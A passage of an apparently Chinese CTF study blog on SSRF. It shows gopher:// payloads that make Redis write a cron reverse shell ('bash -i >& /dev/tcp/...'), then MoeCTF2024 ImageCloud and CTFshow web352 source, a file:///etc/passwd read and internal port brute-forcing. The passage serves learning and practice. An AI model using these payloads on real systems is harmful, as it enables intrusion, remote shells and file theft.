class="number">0</span>d%<span class="number">0</span>a$<span class="number">16</span>%<span class="number">0</span>d%<span class="number">0</span>a/var/spool/cron/%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">6</span>%<span class="number">0</span>d%<span class="number">0</span>aconfig%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>aset%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">10</span>%<span class="number">0</span>d%<span class="number">0</span>adbfilename%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>aroot%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>asave%<span class="number">0</span>d%<span class="number">0</span>aquit%<span class="number">0</span>d%<span class="number">0</span>a&#x27;</span><br></pre></td></tr></table></figure>



<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">gopher</span>://<span class="number">127.0.0.1:6379</span>/_*<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">8</span>%<span class="number">0</span>d%<span class="number">0</span>aflushall%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>aset%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>a1%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">64</span>%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>a*/<span class="number">1</span> * * * * bash -i &gt;&amp; /dev/tcp/<span class="number">127.0.0.1</span>/<span class="number">45952</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span>%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">6</span>%<span class="number">0</span>d%<span class="number">0</span>aconfig%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>aset%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>adir%<span class="number">0</span>d%<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>经过url解码便是：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">gopher</span>://<span class="number">127.0.0.1:6379</span>/_*<span class="number">1</span> $<span class="number">8</span> flushall *<span class="number">3</span> $<span class="number">3</span> set $<span class="number">1</span> <span class="number">1</span> $<span class="number">64</span> */<span class="number">1</span> * * * * bash -i &gt;&amp; /dev/tcp/<span class="number">127.0.0.1</span>/<span class="number">45952</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span> *<span class="number">4</span> $<span class="number">6</span> config $<span class="number">3</span> set $<span class="number">3</span> dir $<span class="number">16</span> /var/www/html/ *<span class="number">4</span> $<span class="number">6</span> config $<span class="number">3</span> set $<span class="number">10</span> dbfilename $<span class="number">4</span> root *<span class="number">1</span> $<span class="number">4</span> save quit</span><br></pre></td></tr></table></figure>

<h2 id="题目回顾"><a href="#题目回顾" class="headerlink" title="题目回顾"></a>题目回顾</h2><p>回顾一下MoeCTF2024中的两道SSRF题目吧：</p>
<h3 id="ImageCloud前置"><a href="#ImageCloud前置" class="headerlink" title="ImageCloud前置"></a><strong>ImageCloud前置</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="literal">false</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$image_info</span> = <span class="title function_ invoke__">getimagesizefromstring</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="variable">$mime_type</span> = <span class="variable">$image_info</span>[<span class="string">&#x27;mime&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: &#x27;</span> . <span class="variable">$mime_type</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当时并不能看懂，现在就能有些认知了。看到<code>curl_exec</code>、<code>curl_init</code>之类很明显的SSRF特征。</p>
<p>题目提示flag在&#x2F;etc&#x2F;passwd里，于是我们直接利用file伪协议读取flag文件即可：<br><code>payload: file:///etc/passwd</code>。</p>
<h3 id="ImageCloud"><a href="#ImageCloud" class="headerlink" title="ImageCloud"></a><strong>ImageCloud</strong></h3><p>app.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_file, abort, redirect, url_for</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> mimetypes</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">UPLOAD_FOLDER = <span class="string">&#x27;static/&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER</span><br><span class="line"></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">uploaded_files = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;图片上传&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; action=&quot;/upload&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &lt;h2&gt;已上传的图片&lt;/h2&gt;</span></span><br><span class="line"><span class="string">    &lt;ul&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> + <span class="string">&#x27;&#x27;</span>.join(</span><br><span class="line">        <span class="string">f&#x27;&lt;li&gt;&lt;a href=&quot;/image?url=http://localhost:5000/static/<span class="subst">&#123;filename&#125;</span>&quot;&gt;<span class="subst">&#123;filename&#125;</span>&lt;/a&gt;&lt;/li&gt;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> uploaded_files</span><br><span class="line">    ) + <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;/ul&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;未找到文件部分&#x27;</span>, <span class="number">400</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;未选择文件&#x27;</span>, <span class="number">400</span></span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        ext = filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower()</span><br><span class="line"></span><br><span class="line">        unique_filename = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">len</span>(uploaded_files)&#125;</span>_<span class="subst">&#123;filename&#125;</span>&quot;</span></span><br><span class="line">        filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], unique_filename)</span><br><span class="line"></span><br><span class="line">        file.save(filepath)</span><br><span class="line">        uploaded_files.append(unique_filename)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;文件类型不支持&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/image&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_image</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;URL 参数缺失&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        response.raise_for_status()</span><br><span class="line">        img = Image.<span class="built_in">open</span>(BytesIO(response.content))</span><br><span class="line"></span><br><span class="line">        img_io = BytesIO()</span><br><span class="line">        img.save(img_io, img.<span class="built_in">format</span>)</span><br><span class="line">        img_io.seek(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> send_file(img_io, mimetype=img.get_format_mimetype())</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;无法加载图片: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(UPLOAD_FOLDER):</span><br><span class="line">        os.makedirs(UPLOAD_FOLDER)</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>app2.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_file, abort, redirect, url_for</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> mimetypes</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">UPLOAD_FOLDER = <span class="string">&#x27;uploads/&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER</span><br><span class="line"></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">uploaded_files = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_mimetype</span>(<span class="params">file_path</span>):</span><br><span class="line">    mime = mimetypes.guess_type(file_path)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> mime <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> Image.<span class="built_in">open</span>(file_path) <span class="keyword">as</span> img:</span><br><span class="line">                mime = img.get_format_mimetype()</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            mime = <span class="string">&#x27;application/octet-stream&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> mime</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_free_port_in_range</span>(<span class="params">start_port, end_port</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        port = random.randint(start_port, end_port)</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, port))</span><br><span class="line">        s.close()</span><br><span class="line">        <span class="keyword">return</span> port </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;图片上传&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; action=&quot;/upload&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &lt;h2&gt;已上传的图片&lt;/h2&gt;</span></span><br><span class="line"><span class="string">    &lt;ul&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> + <span class="string">&#x27;&#x27;</span>.join(<span class="string">f&#x27;&lt;li&gt;&lt;a href=&quot;/image/<span class="subst">&#123;filename&#125;</span>&quot;&gt;<span class="subst">&#123;filename&#125;</span>&lt;/a&gt;&lt;/li&gt;&#x27;</span> <span class="keyword">for</span> filename <span class="keyword">in</span> uploaded_files) + <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;/ul&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;未找到文件部分&#x27;</span>, <span class="number">400</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;未选择文件&#x27;</span>, <span class="number">400</span></span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line"></span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        ext = filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower()</span><br><span class="line"></span><br><span class="line">        unique_filename = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">len</span>(uploaded_files)&#125;</span>_<span class="subst">&#123;filename&#125;</span>&quot;</span></span><br><span class="line">        filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], unique_filename)</span><br><span class="line"></span><br><span class="line">        file.save(filepath)</span><br><span class="line">        uploaded_files.append(unique_filename)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;文件类型不支持&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/image/&lt;filename&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_image</span>(<span class="params">filename</span>):</span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(filepath):</span><br><span class="line">        mime = get_mimetype(filepath)</span><br><span class="line">        <span class="keyword">return</span> send_file(filepath, mimetype=mime)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;文件未找到&#x27;</span>, <span class="number">404</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(UPLOAD_FOLDER):</span><br><span class="line">        os.makedirs(UPLOAD_FOLDER)</span><br><span class="line">    port = find_free_port_in_range(<span class="number">5001</span>, <span class="number">6000</span>)</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=port)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>附件可知，flag一图片形式被存储在内网的uploads文件夹下面，并通过image目录访问，外部服务开放指定端口5000，内部服务则开放在5001-6000的随机端口，</p>
<p>这里画了张图用来理解：</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">+---------------------------+</span></span><br><span class="line">|     你访问的网站         |</span><br><span class="line"><span class="section">|  http://...:5000         |</span></span><br><span class="line"><span class="section">+------------+-------------+</span></span><br><span class="line"><span class="code">             |</span></span><br><span class="line"><span class="code">             v 你传入 SSRF URL</span></span><br><span class="line"><span class="code">     /image?url=http://localhost:PORT/image/flag.jpg</span></span><br><span class="line"><span class="code">             |</span></span><br><span class="line"><span class="section">             v</span></span><br><span class="line"><span class="section">+------------+-------------+</span></span><br><span class="line"><span class="section">| 外部 Flask 服务 (5000端口)|</span></span><br><span class="line"><span class="section">+------------+-------------+</span></span><br><span class="line"><span class="code">             |</span></span><br><span class="line"><span class="code">             v 发起请求</span></span><br><span class="line"><span class="code">     http://localhost:PORT/image/flag.jpg</span></span><br><span class="line"><span class="code">             |</span></span><br><span class="line"><span class="section">             v</span></span><br><span class="line"><span class="section">+---------------------------+</span></span><br><span class="line">| 内部 Flask 服务（随机端口）|</span><br><span class="line">| 可能在 5001~6000 之间      |</span><br><span class="line"><span class="section">| 提供 /image/flag.jpg 接口  |</span></span><br><span class="line"><span class="section">+---------------------------+</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>因此需要抓包爆破，</p>
<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416011910810.png" alt="image-20250416011910810"></p>
<p>成功爆出图片，截图OCR并修改即可。</p>
<h2 id="CTFshow刷题"><a href="#CTFshow刷题" class="headerlink" title="CTFshow刷题"></a>CTFshow刷题</h2><h3 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span 